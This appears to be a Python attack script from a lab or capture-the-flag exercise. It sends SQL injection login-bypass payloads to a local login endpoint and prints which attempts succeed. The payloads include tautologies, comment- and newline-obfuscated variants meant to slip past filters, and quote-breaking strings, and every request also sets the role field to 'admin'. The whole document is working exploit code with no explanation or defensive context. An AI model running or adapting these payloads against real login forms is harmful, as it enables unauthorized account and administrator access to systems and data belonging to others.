import urllib.request, urllib.parse, json

def post(username, password, role='admin'):
    data = urllib.parse.urlencode({'username': username, 'password': password, 'role': role}).encode()
    req = urllib.request.Request('http://localhost:5003/login', data=data)
    with urllib.request.urlopen(req) as resp:
        raw = resp.read().decode()
    try:
        j = json.loads(raw)
        return j.get('message',''), j.get('success', False)
    except Exception:
        return raw[:200], False

payloads = [
    ('1 OR 1=1', 'x'),
    ('1/**/OR/**/1=1', 'x'),
    ('1%0AOR%0A1=1', 'x'),
    ('admin" or "1"="1', 'x'),
    ('admin\' or \'1\'=\'1', 'x'),
]

for u,p in payloads:
    try:
        u_dec = urllib.parse.unquote(u)
    except Exception:
        u_dec = u
    msg, ok = post(u_dec, p)
    print(repr(u_dec), '->', ok, '|', msg)
